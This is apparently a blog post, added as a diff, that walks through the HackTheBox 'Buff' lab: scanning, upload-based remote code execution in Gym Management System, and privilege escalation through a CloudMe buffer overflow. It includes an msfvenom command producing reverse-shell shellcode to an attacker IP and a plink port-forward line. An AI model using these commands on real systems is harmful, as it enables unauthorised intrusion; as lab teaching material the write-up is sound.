@@ -1,0 +1,168 @@
+---
+title: HackTheBox Buff Write up
+desc: In this writeup I will walk you through my process of solving buff.
+layout: post
+date: November 23, 2020 4:06 AM
+image: /images/posts/buff.jpg
+---
+<h1 class="cyan-text">HackTheBox Buff Write up</h1>
+
+<pre><code>---------------------------------
+--- IP Address : 10.10.10.198 ---
+--- Platform   : Windows --------
+--- Difficulty : Easy------------
+---------------------------------</code></pre>
+
+<h2 class="cyan-text">Reconnaissance</h2>
+
+<div class="content white-text"><p>Fast scan using FinalRecon and full scan using nmap...</p></div>
+
+<pre><code>$ finalrecon --ps http://10.10.10.198
+ ______  __   __   __   ______   __
+/\  ___\/\ \ /\ "-.\ \ /\  __ \ /\ \
+\ \  __\\ \ \\ \ \-.  \\ \  __ \\ \ \____
+ \ \_\   \ \_\\ \_\\"\_\\ \_\ \_\\ \_____\
+  \/_/    \/_/ \/_/ \/_/ \/_/\/_/ \/_____/
+ ______   ______   ______   ______   __   __
+/\  == \ /\  ___\ /\  ___\ /\  __ \ /\ "-.\ \
+\ \  __< \ \  __\ \ \ \____\ \ \/\ \\ \ \-.  \
+ \ \_\ \_\\ \_____\\ \_____\\ \_____\\ \_\\"\_\
+  \/_/ /_/ \/_____/ \/_____/ \/_____/ \/_/ \/_/
+
+[>] Created By : thewhiteh4t
+[>] Version    : 1.0.7
+
+[+] Checking for Updates...[ Up-To-Date ]
+
+[+] Target : http://10.10.10.198
+
+[!] Starting Port Scan...
+
+[+] Testing Top 1000 Ports...
+
+[+] 8080   http-alt
+
+[+] Completed in 0:00:03.785169
+
+[!] Exporting to /usr/share/finalrecon/dumps/10.10.10.198.txt</code></pre>
+
+<pre><code>$ nmap -p- -T3 -Pn 10.10.10.198
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-08-20 22:52 IST
+Stats: 0:00:51 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 12.80% done; ETC: 22:59 (0:05:54 remaining)
+Nmap scan report for 10.10.10.198
+Host is up (0.10s latency).
+Not shown: 65533 filtered ports
+PORT     STATE SERVICE
+7680/tcp open  pando-pub
+8080/tcp open  http-proxy
+
+Nmap done: 1 IP address (1 host up) scanned in 267.59 seconds</code></pre>
+
+<div class="content white-text"><p>So, just two open ports, next I performed version enumeration on these ports using nmap...</p></div>
+
+<pre><code>$ nmap -p 7680,8080 -Pn -sV 10.10.10.198
+
+Nmap scan report for 10.10.10.198
+Host is up (0.24s latency).
+
+PORT     STATE SERVICE    VERSION
+7680/tcp open  pando-pub?
+8080/tcp open  http       Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 53.93 seconds</code></pre>
+
+<div class="content white-text"><p>After this I started enumerating different pages and source code for anything juicy and on Contacts page I saw this...</p></div>
+
+<div class="center-img">     <img class="responsive-img post-img" src="https://i.imgur.com/tEDnnxW.png"> </div>
+
+<div class="content white-text"><p>I looked it up on searchsploit for potential matches and I got multiple...</p></div>
+
+<pre><code>$ searchsploit gym management system 1.0
+-------------------------------------------------------- ---------------------------------
+ Exploit Title                                          |  Path
+-------------------------------------------------------- ---------------------------------
+Gym Management System 1.0 - 'id' SQL Injection          | php/webapps/48936.txt
+Gym Management System 1.0 - Authentication Bypass       | php/webapps/48940.txt
+Gym Management System 1.0 - Stored Cross Site Scripting | php/webapps/48941.txt
+Gym Management System 1.0 - Unauthenticated Remote Code | php/webapps/48506.py
+-------------------------------------------------------- ---------------------------------
+Shellcodes: No Results</code></pre>
+
+<h2 class="cyan-text">Intrusion</h2>
+
+<pre><code>Exploit Title: Gym Management System 1.0 - Unauthenticated Remote Code Execution
+Exploit Author: Bobby Cooke
+Date: 2020-05-21
+Vulnerability Description: 
+
+Gym Management System version 1.0 suffers from an Unauthenticated File Upload Vulnerability allowing Remote Attackers to gain Remote Code Execution on the Hosting Web server via uploading a maliciously crafted PHP file that bypasses the image upload filters</code></pre>
+
+<div class="content white-text"><p>This exploit uses upload.php present on the web server to upload a malicious PHP file, to bypass extension allow listing it adds a double extension at the end of file name, to bypass file type check it modifies 'Content-Type' headers in the POST request to 'image/png'. In the 'file' parameter of the POST request it inserts a PHP 'shell_exec' payload to achieve code execution.</p></div>
+
+<div class="center-img">     <img class="responsive-img post-img" src="https://i.imgur.com/cI1jHHu.png"> </div>
+
+<div class="content white-text"><p>At this point I tried to curl reverse shells but they were being removed constantly (antivirus?), finally netcat 64 bit worked!</p></div>
+
+<div class="center-img">     <img class="responsive-img post-img" src="https://i.imgur.com/byWRlju.png"> </div>
+
+<div class="content white-text"><p>In HTB windows boxes the user flag is placed in Desktop of the user, I checked the Desktop of shaun and got user flag!</p></div>
+
+<h2 class="cyan-text">Enumeration</h2>
+
+<div class="content white-text"><p>After some enumeration I found a setup file in Downloads directory...</p></div>
+
+<div class="center-img">     <img class="responsive-img post-img" src="https://i.imgur.com/T6GjXBO.png"> </div>
+
+<div class="content white-text"><p>so I checked the running process using tasklist command to see if this application was running and it was! The filename of the setup file gives away the version of this application so that makes things a bit easier for finding an exploit...</p></div>
+
+<pre><code>twh.exe                       8680                            0      1,596 K
+cmd.exe                       5052                            0      2,200 K
+svchost.exe                   9620                            0      6,568 K
+cmd.exe                       4956                            0      3,252 K
+conhost.exe                   2468                            0     11,044 K
+CloudMe.exe                  10064                            0     37,608 K
+tasklist.exe                  9876                            0      7,472 K
+taskkill.exe                  1540                            0      6,860 K</code></pre>
+
+<h2 class="cyan-text">Privilege Escalation</h2>
+
+<div class="content white-text"><p>Once again I looked it up on searchsploit and got these results...</p></div>
+
+<pre><code>$ searchsploit cloudme 1.11.2
+-------------------------------------------------------- ---------------------------------
+ Exploit Title                                          |  Path
+-------------------------------------------------------- ---------------------------------
+CloudMe 1.11.2 - Buffer Overflow (PoC)                  | windows/remote/48389.py
+CloudMe 1.11.2 - Buffer Overflow (SEH_DEP_ASLR)         | windows/local/48499.txt
+CloudMe 1.11.2 - Buffer Overflow ROP (DEP_ASLR)         | windows/local/48840.py
+CloudMe Sync 1.11.2 - Buffer Overflow + Egghunt         | windows/remote/46218.py
+CloudMe Sync 1.11.2 Buffer Overflow - WoW64 (DEP Bypass | windows_x86-64/remote/46250.py
+-------------------------------------------------------- ---------------------------------
+Shellcodes: No Results</code></pre>
+
+<div class="content white-text"><p>The exploit is written in python and python was not installed on the machine, to tackle this challenge I used plink utility which comes along with the well know PuTTY. Plink is a command-line connection tool similar to UNIX ssh, one if it's command line options (-R) allows to forward remote port to local address, using this option I was able to connect to the target port which was only listening on localhost but before that I generated a shellcode using msfvenom which will execute netcat we downloaded earlier to send us another shell...</p></div>
+
+<pre><code>msfvenom -p windows/exec CMD="C:\\xampp\\htdocs\\gym\\upload\\twh.exe 10.10.14.55 5555 -e cmd.exe" -b '\x00\x0A\x0D' -f python -v payload</code></pre>
+
+<div class="center-img">     <img class="responsive-img post-img" src="https://i.imgur.com/sgPSe3k.png"> </div>
+
+<div class="content white-text"><p>I replaced the shellcode in exploit script with the fresh one I generated with my ip and port...</p></div>
+
+<div class="center-img">     <img class="responsive-img post-img" src="https://i.imgur.com/46z9ZaM.png"> </div>
+
+<div class="content white-text"><p>Now I downloaded plink.exe using curl and started another netcat listening on port 5555 and launched exploit using the current netcat connection...</p></div>
+
+<pre><code>plink.exe -l twh -R 8888:127.0.0.1:8888 10.10.14.55 "python /home/twh/htb/buff/cmpwn.py"
+
+-l -> username
+-R -> listen-port:host:port
+      Forward remote port to local address</code></pre>
+
+<div class="center-img">     <img class="responsive-img post-img" src="https://i.imgur.com/pk8uibU.png"> </div>
+
+<div class="content white-text"><p>Got Root!</p></div>
+
+<div class="center-img">     <img class="responsive-img post-img" src="https://i.imgur.com/u16DlHz.png"> </div>
